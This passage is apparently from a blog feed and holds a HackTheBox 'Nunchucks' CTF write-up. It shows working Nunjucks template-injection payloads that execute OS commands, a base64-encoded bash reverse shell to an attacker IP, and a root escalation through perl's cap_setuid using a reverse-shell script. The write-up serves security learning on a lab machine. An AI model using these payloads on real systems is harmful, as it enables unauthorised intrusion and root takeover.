</span></span><span class="line"><span class="cl"><span class="s2">&#34;node_args&#34;</span>:<span class="o">[]</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_exec_path&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks/server.js&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_cwd&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;exec_interpreter&#34;</span>:<span class="s2">&#34;node&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;exec_mode&#34;</span>:<span class="s2">&#34;cluster_mode&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_out_log_path&#34;</span>:<span class="s2">&#34;/home/david/.pm2/logs/server-out-6.log&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_err_log_path&#34;</span>:<span class="s2">&#34;/home/david/.pm2/logs/server-error-6.log&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_pid_path&#34;</span>:<span class="s2">&#34;/home/david/.pm2/pids/server-6.pid&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;km_link&#34;</span>:false
</span></span><span class="line"><span class="cl"><span class="s2">&#34;vizion_running&#34;</span>:false
</span></span><span class="line"><span class="cl"><span class="s2">&#34;NODE_APP_INSTANCE&#34;</span>:5
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PM2_USAGE&#34;</span>:<span class="s2">&#34;CLI&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;OLDPWD&#34;</span>:<span class="s2">&#34;/var/www&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;_&#34;</span>:<span class="s2">&#34;/usr/local/bin/pm2&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;MAIL&#34;</span>:<span class="s2">&#34;/var/mail/david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;DBUS_SESSION_BUS_ADDRESS&#34;</span>:<span class="s2">&#34;unix:path=/run/user/1000/bus&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PATH&#34;</span>:<span class="s2">&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;HUSHLOGIN&#34;</span>:<span class="s2">&#34;FALSE&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;JOURNAL_STREAM&#34;</span>:<span class="s2">&#34;9:35778&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_RUNTIME_DIR&#34;</span>:<span class="s2">&#34;/run/user/1000&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SESSION_ID&#34;</span>:<span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_VTNR&#34;</span>:<span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;SHLVL&#34;</span>:<span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;USER&#34;</span>:<span class="s2">&#34;david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LESSOPEN&#34;</span>:<span class="s2">&#34;| /usr/bin/lesspipe %s&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;TERM&#34;</span>:<span class="s2">&#34;linux&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SESSION_CLASS&#34;</span>:<span class="s2">&#34;user&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LESSCLOSE&#34;</span>:<span class="s2">&#34;/usr/bin/lesspipe %s %s&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;INVOCATION_ID&#34;</span>:<span class="s2">&#34;d8a8bc4baeb140c685790fc6e1974718&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LS_COLORS&#34;</span>:<span class="s2">&#34;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LANG&#34;</span>:<span class="s2">&#34;en_GB.UTF-8&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;HOME&#34;</span>:<span class="s2">&#34;/home/david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;MOTD_SHOWN&#34;</span>:<span class="s2">&#34;pam&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SESSION_TYPE&#34;</span>:<span class="s2">&#34;tty&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LOGNAME&#34;</span>:<span class="s2">&#34;david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PWD&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SEAT&#34;</span>:<span class="s2">&#34;seat0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;SHELL&#34;</span>:<span class="s2">&#34;/bin/bash&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PM2_HOME&#34;</span>:<span class="s2">&#34;/home/david/.pm2&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;unique_id&#34;</span>:<span class="s2">&#34;cc712ea0-c7b6-40af-9a85-94d9a4fee31a&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;launching&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_uptime&#34;</span>:1636123032873
</span></span><span class="line"><span class="cl"><span class="s2">&#34;axm_actions&#34;</span>:<span class="o">[]</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;axm_monitor&#34;</span>:<span class="o">{}</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;axm_options&#34;</span>:<span class="o">{}</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;axm_dynamic&#34;</span>:<span class="o">{}</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;created_at&#34;</span>:1633378615869
</span></span><span class="line"><span class="cl"><span class="s2">&#34;restart_time&#34;</span>:2
</span></span><span class="line"><span class="cl"><span class="s2">&#34;unstable_restarts&#34;</span>:0
</span></span><span class="line"><span class="cl"><span class="s2">&#34;_pm2_version&#34;</span>:<span class="s2">&#34;5.1.1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;version&#34;</span>:<span class="s2">&#34;1.0.0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;versioning&#34;</span>:null
</span></span><span class="line"><span class="cl"><span class="s2">&#34;node_version&#34;</span>:<span class="s2">&#34;10.19.0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_id&#34;</span>:6
</span></span><span class="line"><span class="cl"><span class="s2">&#34;exit_code&#34;</span>:0<span class="o">}</span><span class="nv">NODE_UNIQUE_ID</span><span class="o">=</span><span class="nv">12NODE_CHANNEL_FD</span><span class="o">=</span><span class="m">3</span>
</span></span></code></pre></div><p>Since I know the username, I can try to grab the flag now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --download <span class="s1">&#39;/home/david/user.txt&#39;</span> <span class="s1">&#39;loot/user.txt&#39;</span>
</span></span><span class="line"><span class="cl">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ cat loot/user.txt
</span></span><span class="line"><span class="cl">bac81...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h3 id="shell-as-david">Shell as david</h3>
<h4 id="tpl-shell">tpl-shell</h4>
<p>With write access, I tried to drop my public key to <code>/home/david/.ssh/authorized_keys</code>, but didn&rsquo;t work. One possible thing is that there is no <code>.ssh</code> folder, and to create one I need command execution!</p>
<p>After some hours, I tried the <code>--tpl-shell</code>, and using the <a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine">same blog</a> for syntax reference.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ tplmap -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --tpl-shell
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
</span></span><span class="line"><span class="cl">    Automatic Server-Side Template Injection Detection and Exploitation Tool
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;email&#39;</span> is injectable
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Nunjucks plugin is testing rendering with tag <span class="s1">&#39;{{*}}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Nunjucks plugin has confirmed injection with tag <span class="s1">&#39;{{*}}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap identified the following injection point:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  GET parameter: email
</span></span><span class="line"><span class="cl">  Engine: Nunjucks
</span></span><span class="line"><span class="cl">  Injection: <span class="o">{{</span>*<span class="o">}}</span>
</span></span><span class="line"><span class="cl">  Context: text
</span></span><span class="line"><span class="cl">  OS: linux
</span></span><span class="line"><span class="cl">  Technique: render
</span></span><span class="line"><span class="cl">  Capabilities:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Shell <span class="nb">command</span> execution: no
</span></span><span class="line"><span class="cl">   Bind and reverse shell: no
</span></span><span class="line"><span class="cl">   File write: ok
</span></span><span class="line"><span class="cl">   File read: ok
</span></span><span class="line"><span class="cl">   Code evaluation: ok, javascript code
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Inject multi-line template code. Press ctrl-D to send the lines
</span></span><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt;
</span></span></code></pre></div><p>Previously <code>tplmap</code> identified that I didn&rsquo;t have code/OS command execution, but here&rsquo;s what I got when trying to create <code>.ssh</code> folder:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -la ~/.ssh&#39;)&#34;</span><span class="o">)()</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;mkdir ~/.ssh&#39;)&#34;</span><span class="o">)()</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -l ~/.ssh&#39;)&#34;</span><span class="o">)()</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
</span></span><span class="line"><span class="cl">total 0<span class="se">\n</span>
</span></span></code></pre></div><p>I definitely can execute OS command 😮!</p>
<h4 id="reverse-shell">Reverse shell</h4>
<p>I tried to inject my SSH pubkey and login, but a password prompt pops out. Therefore, I will use a base64 encoded reverse shell.</p>
<p>The payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.46/53 0&gt;&amp;1&#34;&#39;</span> <span class="p">|</span> base64
</span></span><span class="line"><span class="cl">YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ni81MyAwPiYxIgo<span class="o">=</span>
</span></span></code></pre></div><p>Now I&rsquo;ll put that payload to david&rsquo;s home, and execute it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ni81MyAwPiYxIgo= | base64 -d &gt; ~/.0mochi.sh &amp;&amp; chmod +x ~/.0mochi.sh&#39;)&#34;</span><span class="o">)()</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -l ~/.0mochi.sh&#39;)&#34;</span><span class="o">)()</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> david david <span class="m">50</span> Nov  <span class="m">5</span> 15:32 /home/david/.0mochi.sh<span class="se">\n</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash ~/.0mochi.sh&#39;)&#34;</span><span class="o">)()</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
</span></span></code></pre></div><p>On my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>                                                      
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.46<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.122<span class="o">]</span> <span class="m">39352</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1009<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">david@nunchucks:/var/www/store.nunchucks$ id  
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>
</span></span><span class="line"><span class="cl">david@nunchucks:/var/www/store.nunchucks$
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Under <code>/opt</code> there is a backup script written in Perl.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@nunchucks:/opt$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">16</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Oct <span class="m">28</span> 17:03 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">19</span> root root <span class="m">4096</span> Oct <span class="m">28</span> 17:03 ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root root  <span class="m">838</span> Sep  <span class="m">1</span> 12:53 backup.pl
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> Oct <span class="m">28</span> 17:03 web_backups
</span></span><span class="line"><span class="cl">david@nunchucks:/opt$ ls web_backups/ -l
</span></span><span class="line"><span class="cl">total <span class="m">14944</span>
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> root david <span class="m">7651273</span> Sep <span class="m">26</span> 01:06 backup_2021-09-26-1632618416.tar
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> root david <span class="m">7651273</span> Sep <span class="m">26</span> 01:18 backup_2021-09-26-1632619104.tar
</span></span></code></pre></div><p>The script code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/perl</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">strict</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">POSIX</span> <span class="sx">qw(strftime)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">DBI</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">POSIX</span> <span class="sx">qw(setuid)</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="nn">POSIX::</span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$tmpdir</span>        <span class="o">=</span> <span class="s">&#34;/tmp&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$backup_main</span> <span class="o">=</span> <span class="s">&#39;/var/www&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$now</span> <span class="o">=</span> <span class="n">strftime</span><span class="p">(</span><span class="s">&#34;%Y-%m-%d-%s&#34;</span><span class="p">,</span> <span class="nb">localtime</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$tmpbdir</span> <span class="o">=</span> <span class="s">&#34;$tmpdir/backup_$now&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">sub</span> <span class="nf">printlog</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">print</span> <span class="s">&#34;[&#34;</span><span class="p">,</span> <span class="n">strftime</span><span class="p">(</span><span class="s">&#34;%D %T&#34;</span><span class="p">,</span> <span class="nb">localtime</span><span class="p">),</span> <span class="s">&#34;] $_[0]\n&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">sub</span> <span class="nf">archive</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">printlog</span> <span class="s">&#34;Archiving...&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">system</span><span class="p">(</span><span class="s">&#34;/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2&gt;/dev/null&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">printlog</span> <span class="s">&#34;Backup complete in $tmpbdir/backup_$now.tar&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="vg">$&gt;</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">die</span> <span class="s">&#34;You must run this script as root.\n&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">printlog</span> <span class="s">&#34;Backup starts.&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$tmpbdir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">&amp;</span><span class="n">archive</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">printlog</span> <span class="s">&#34;Moving $tmpbdir/backup_$now to /opt/web_backups&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">system</span><span class="p">(</span><span class="s">&#34;/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">printlog</span> <span class="s">&#34;Removing temporary directory&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">rmdir</span><span class="p">(</span><span class="nv">$tmpbdir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">printlog</span> <span class="s">&#34;Completed&#34;</span><span class="p">;</span>
</span></span></code></pre></div><p>When I run it, I find that I passed the first if statement, which checks for root priv.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@nunchucks:/opt$ ./backup.pl 
</span></span><span class="line"><span class="cl"><span class="o">[</span>11/05/21 15:56:43<span class="o">]</span> Backup starts.
</span></span><span class="line"><span class="cl"><span class="o">[</span>11/05/21 15:56:43<span class="o">]</span> Archiving...
</span></span><span class="line"><span class="cl"><span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Backup <span class="nb">complete</span> in /tmp/backup_2021-11-05-1636127803/backup_2021-11-05-1636127803.tar
</span></span><span class="line"><span class="cl"><span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Moving /tmp/backup_2021-11-05-1636127803/backup_2021-11-05-1636127803 to /opt/web_backups
</span></span><span class="line"><span class="cl"><span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Removing temporary directory
</span></span><span class="line"><span class="cl"><span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Completed
</span></span><span class="line"><span class="cl">david@nunchucks:/opt$ 
</span></span></code></pre></div><p>A quick check on Perl capabilities reveals that it has <code>cap_setuid+ep</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@nunchucks:/tmp$ getcap <span class="k">$(</span>which perl<span class="k">)</span>
</span></span><span class="line"><span class="cl">/usr/bin/perl <span class="o">=</span> cap_setuid+ep
</span></span></code></pre></div><h4 id="exploit-cap_setuidep">Exploit cap_setuid+ep</h4>
<p>I tried the <a href="https://gtfobins.github.io/#perl">GTFObins</a> way to exploit the <code>cap_setuid</code> capability, but it didn&rsquo;t spawn me a root shell. However, executing <code>whoami</code> still shows that I&rsquo;m root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@nunchucks:/tmp$ /usr/bin/perl -e <span class="s1">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;/bin/bash&#34;;&#39;</span>
</span></span><span class="line"><span class="cl">david@nunchucks:/tmp$ /usr/bin/perl -e <span class="s1">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;whoami&#34;;&#39;</span>
</span></span><span class="line"><span class="cl">root
</span></span></code></pre></div><p>I also couldn&rsquo;t get the root flag, it returned with permission denied.</p>
<p>The next thing I tried was reusing the backup script, but with all of the code except the header stripped off and I changed the system command for executing reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@nunchucks:/tmp$ cat .0mochi.pl 
</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/perl</span>
</span></span><span class="line"><span class="cl">use strict<span class="p">;</span>
</span></span><span class="line"><span class="cl">use POSIX qw<span class="o">(</span>strftime<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">use DBI<span class="p">;</span>
</span></span><span class="line"><span class="cl">use POSIX qw<span class="o">(</span>setuid<span class="o">)</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">POSIX::setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.46/53 0&gt;&amp;1&#39;&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">david@nunchucks:/tmp$ chmod +x .0mochi.pl 
</span></span></code></pre></div><p>And it worked!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.46<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.122<span class="o">]</span> <span class="m">39386</span>
</span></span><span class="line"><span class="cl">root@nunchucks:/tmp# id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20211105233721153.png" alt="image-20211105233721153"  /></div>
</p>
<p>The flag</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@nunchucks:/tmp# cat /root/root.txt
</span></span><span class="line"><span class="cl">cat /root/root.txt
</span></span><span class="line"><span class="cl">1d2cc...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Gobox</title>
      <link>https://fahmifj.github.io/hackthebox/gobox/</link>
      <pubDate>Sun, 12 Sep 2021 12:33:46 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/gobox/</guid>
      <description>SSTI in Golang, abuse S3 bucket, and NGINX backdoor</description>
